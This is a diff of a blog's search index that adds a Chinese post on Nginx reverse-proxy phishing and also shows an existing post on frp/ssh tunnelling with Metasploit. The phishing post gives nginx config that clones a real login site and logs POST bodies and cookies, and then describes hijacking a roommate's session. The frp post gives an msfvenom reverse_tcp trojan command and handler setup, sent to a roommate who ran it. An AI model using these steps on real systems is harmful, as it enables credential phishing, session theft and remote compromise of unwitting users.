@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[nginx反向代理钓鱼]]></title>
+    <url>%2F2020%2F06%2F19%2Fnginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC%2F</url>
+    <content type="text"><![CDATA[公司那边说过几天要有一个钓鱼演练。组里大佬说是让研究一下Nginx反向代理钓鱼。 什么是反向代理这里我找了一段比较官方的解释。 反向代理（Reverse Proxy）是指以代理服务器来接受 Internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 Internet 上请求连接的客户端，此时代理服务器对外就表现为一个服务器。我自己的理解 代理服务器就是充当了一个“中间人”。 Nginx反向代理实例这里拿我的一台vps做演示 ip:39.xxx.xxx.x。因为vps上装了宝塔 而且 又在宝塔里装了Nginx。 首先找到Nginx的目录。在我的vps上 目录是/www/server/nginx/ 找到/www/server/nginx/config/nginx.conf文件 反向代理 https://www.xxx.com/ 12345678 location / &#123; #如果后端的服务器返回 502、504、执行超时等错误，自动将请求转发到 upstream 负载均衡池中的另一台服务器，实现故障转移。 proxy_next_upstream http_502 http_504 error timeout invalid_header; proxy_pass https://www.xxx.com/; proxy_set_header Host 39.xxx.xxx.9; proxy_set_header X-Forwarded-For $remote_addr; &#125; proxy_set_header 指令用于在向反向代理的后端 Web 服务器发起请求时添加指定的 Header头信息。 当后端 Web 服务器上有多个基于域名的虚拟主机时，要通过添加 Header 头信息 Host，用于指定请求的域名，这样后端 Web 服务器才能识别该反向代理访问请求由哪一个虚拟主机来处理。(39.xxx.xxx.9是我的vps地址。www.xxx.com是要反向代理的目标) 最后我们还需要制定以下 访问日志需要获取的内容 也是在nginx.conf里修改.在http下 1log_format TestLog escape=json '$request_filename $http_x_forwarded_for $fastcgi_script_name $document_root $request_body' $http_cookie; TestLog 要和上面的access_log对应不然日志不会起作用。 重点是$request_body(获取post数据),$http_cookie(获取cookie数据)这就是我们钓鱼的核心了。当有人访问并登陆我们反向代理的网站以后 我们点开日志就可以看到他的cookie和post提交的用户名和密码了。 反向代理钓鱼实例这里我用我们学校的一个测试系统举例子 按照上面步骤反向代理学校的测试系统 之后看到一个一模一样的界面。为了怕学校领导找上门来我把图片都撤了。 这时候叫上万能的舍友来登陆一波康康。 根据Nginx.conf确定日志路径在/www/wwwlogs/access.log。讲道理舍友登陆了以后应该记录了 他登陆时提交的post 里面应该包含账号密码。和登录后的cookie信息。 访问日志后看到登陆时的账号密码。问题是网站为https 这个密码是经过加密的，无法破解所以我们无法用账号密码进行登陆。不过问题不大JSESSIONID后面的是获取到登陆后的cookie。直接替换cookie即可登陆舍友的账号。 burp进行正则匹配cookie后进行替换。最后成功登陆。]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>钓鱼</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[ssh与frp实现内网穿透]]></title>
     <url>%2F2020%2F03%2F16%2Fssh%E4%B8%8Efrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%2F</url>
     <content type="text"><![CDATA[很多时候我们需要内网穿透来进行一些操作 因为我们本地是内网而且在没有端口转发的情况下 msf不能很好的去使用。所以今天来总结一下 利用ssh frp实现内网穿透后 利用msf的过程。 首先我们要准备一台公网vps。然后一台内网kali。一个目标（这里那我舍友的做实验） 12vps : 39.168.xxx.xkali: 192.168.221.128 frp内网穿透首先现在frp到vps和kali 1https://github.com/fatedier/frp/releases vps上启动frps 服务端 kali上启动frpc 客户端 vps启动frps123vim frps.inibind_port = 7000//默认就是这样不用去修改启动frps： ./frps -c ./frps.ini kali启动frpc1vim frpc.ini 39.xx那个是vps的地址 7000是frpc的工作端口必须和上面frps保持一致 后面是服务器用6000端口转发到本机的5555端口 最后启动frpc 1启动frpc: ./frpc -c ./frpc.ini 使用msf测试木马上线1msfvenom -p windows/meterpreter/reverse_tcp lhost=39.xxx.xxx.x lport=6000 -f exe x&gt;ma.exe 生成木马 地址设置为你的vps。端口设置成上面服务器用的端口6000 最后我们监听kali本地的5555端口等待上线。 123456msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 127.0.0.1set lport 5555exploit 最后发给舍友 舍友双击以后反弹回了shell ssh内网穿透因为这里kali网络有点问题所以用ssh并没有成功。也懒得去搞桥接了 这里我用我本机来测试 把本机端口映射到公网上。和msf道理一样的。 本机上执行 123456789ssh -fCNR 7777:192.168.1.106:80 root@39.xxx.xxx.x-f 将连接送入后台执行 不占用当前shell-C 压缩传输 提高传输速度-N 建立隐藏链接 已经建立链接 但是看不到会话-R 远程端口转发-L 本地端口转发-D 动态端口转发-p 指定ssh端口把本地的80端口 反弹到vps的7777端口上 如果还是不懂怎么用ssh进行转发参考 https://www.cnblogs.com/hac425/p/9416774.html]]></content>
